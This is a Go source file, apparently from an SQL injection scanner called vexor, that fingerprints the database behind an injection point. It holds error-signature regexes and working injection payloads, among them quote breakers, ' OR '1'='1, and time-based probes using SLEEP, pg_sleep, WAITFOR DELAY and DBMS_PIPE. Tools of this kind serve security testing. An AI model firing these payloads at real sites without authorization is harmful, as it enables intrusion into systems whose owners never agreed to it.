package dbms

import (
	"context"
	"regexp"
	"time"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli/common"
	"github.com/0xseif-code/vexor/internal/sqli/injection"
)

// errorSig maps a regular expression onto a DB name. Orders matter: more
// specific patterns first.
var errorSigs = []struct {
	db string
	re *regexp.Regexp
}{
	{MySQL, regexp.MustCompile(`(?i)you have an error in your sql syntax|mysql server|mariadb|mysqld|sqlstate[0-9a-f]{5}|mysql_fetch|mysqli_|warning: mysql_|xpath syntax error|extractvalue|updatexml|duplicate entry|floor\(rand|name_const|gtid_subset|malformed gtid|data truncated|data too long|out of range|bigint unsigned|exp\(\(`),},
	{Oracle, regexp.MustCompile(`(?i)\bORA-[0-9]{5}|oracle error|pli-sql|\bPLS-[0-9]{4}`)},
	{SQLite, regexp.MustCompile(`(?i)sqlite|sql logic error|no such column|SQLiteDatabase`)},
	{MSSQL, regexp.MustCompile(`(?i)\[microsoft\]|microsoft oledb provider for sql server|microsoft odbc sql server|odbc driver [0-9]+ for sql server|sqlclient|unclosed quotation mark|incorrect syntax near|sql server does not exist`)},
	{Postgres, regexp.MustCompile(`(?i)postgres(ql)?|pg_query|pg_execute|invalid input syntax for type|unterminated quoted string|synchronousexception|query failed:`)},
}

// MatchError scans a response body for a known DBMS error signature. It
// returns the DB name and the matching snippet, or "" when nothing matches.
func MatchError(body []byte) (string, string) {
	hay := body
	if len(hay) > 1<<20 {
		hay = hay[:1<<20]
	}
	text := string(hay)
	for _, s := range errorSigs {
		if m := s.re.FindString(text); m != "" {
			return s.db, m
		}
	}
	return "", ""
}

// Fingerprinter determines which DBMS likely backs the injection point. It
// only needs the very first injection point: the target is the same database
// behind every parameter.
//
// The default (cheap) run is tuned for speed: it only pokes the point with
// unbalanced quotes and matches the response against known DBMS error
// signatures. That is the common-case fingerprint (error-based backends) and
// costs at most a handful of requests. When Full is set, it additionally runs
// non-destructive structure probes and, as a last resort, one-shot time probes
// so a non-verbose backend can still be identified.
type Fingerprinter struct {
	Client   *httpclient.Client
	Throttle common.Throttle
	Timeout  time.Duration
	Meter    *common.Meter
	Point    *injection.InjectionPoint
	// Full enables the expensive structure/time probing stage used only when a
	// DB name is actually required (enumeration/dump) and the cheap pass and
	// the detection techniques failed to name the backend.
	Full bool
}

// Run returns a canonical DB name, falling back to Generic.
func (f *Fingerprinter) Run(ctx context.Context) (string, error) {
	if f.Client == nil || f.Point == nil {
		return Generic, nil
	}

	if name := f.matchErrors(ctx); name != "" {
		return name, nil
	}
	if !f.Full {
		return Generic, nil
	}
	base, err := common.CaptureBaseline(ctx, f.Client, f.Throttle, f.Point.RenderBase(), f.Timeout, f.Meter)
	if err != nil {
		return Generic, err
	}
	if name := f.probeStructure(ctx, base); name != "" {
		return name, nil
	}
	if name := f.probeTime(ctx, base); name != "" {
		return name, nil
	}
	return Generic, nil
}

// matchErrors pokes the point with unbalanced quotes to provoke a verbose SQL
// error and matches the response against known signatures.
func (f *Fingerprinter) matchErrors(ctx context.Context) string {
	for _, trailer := range []string{"'", "\"", "')", "' OR '1'='1"} {
		if ctx.Err() != nil {
			return ""
		}
		orig := f.Point.Value
		rr := f.Point.Render(orig + trailer)
		resp, err := common.Do(ctx, f.Client, f.Throttle, rr.Method, rr.URL, rr.Body, rr.Headers, f.Timeout, f.Meter)
		if err != nil {
			continue
		}
		if name, _ := MatchError(resp.Body); name != "" {
			return name
		}
	}
	return ""
}

// dbProbe is a probe whose response should stay baseline-like for its DB.
type dbProbe struct {
	db string
	pl string
}

var structureProbes = []dbProbe{
	{MySQL, "{orig} XOR 1"},
	{MySQL, "{orig} SOUNDS LIKE {orig}"},
	{Postgres, "{orig}::varchar"},
	{Postgres, "{orig} IS TRUE"},
	{SQLite, "{orig} GLOB 'x'"},
	{SQLite, "{orig} COLLATE BINARY"},
	{MSSQL, "{orig};SELECT 1-- -"},
}

const similarThreshold = 0.85

// probeStructure runs cheap non-destructive probes; whichever DB's operator
// parses and evaluates like the baseline is the best guess.
func (f *Fingerprinter) probeStructure(ctx context.Context, base *common.Baseline) string {
	for _, p := range structureProbes {
		if ctx.Err() != nil {
			return ""
		}
		rr := f.Point.Render(p.pl)
		resp, err := common.Do(ctx, f.Client, f.Throttle, rr.Method, rr.URL, rr.Body, rr.Headers, f.Timeout, f.Meter)
		if err != nil {
			continue
		}
		if common.Sim(base.Sig, common.SigOf(resp)) >= similarThreshold {
			return p.db
		}
	}
	return ""
}

// probeTime uses a one-shot sleep for each candidate DB and watches the
// response latency. It is the last resort because it costs the delay.
func (f *Fingerprinter) probeTime(ctx context.Context, base *common.Baseline) string {
	probes := []dbProbe{
		{MySQL, "{orig}' AND SLEEP(2)-- -"},
		{Postgres, "{orig}' AND pg_sleep(2)-- -"},
		{MSSQL, "{orig};WAITFOR DELAY '0:0:2'-- -"},
		{Oracle, "{orig} AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',2) FROM DUAL) IS NOT NULL-- -"},
	}
	threshold := base.Median + 1100*time.Millisecond
	for _, p := range probes {
		if ctx.Err() != nil {
			return ""
		}
		rr := f.Point.Render(p.pl)
		resp, err := common.Do(ctx, f.Client, f.Throttle, rr.Method, rr.URL, rr.Body, rr.Headers, f.Timeout, f.Meter)
		if err != nil {
			continue
		}
		if resp.Duration >= threshold {
			return p.db
		}
	}
	return ""
}

// HasOOB reports whether a payload set includes OOB payloads.
func HasOOB(p *Payloads) bool {
	return p != nil && len(p.OOB) > 0
}

// Stackable reports whether the DB supports statement stacking.
func Stackable(p *Payloads) bool {
	return p != nil && p.StackedOK
}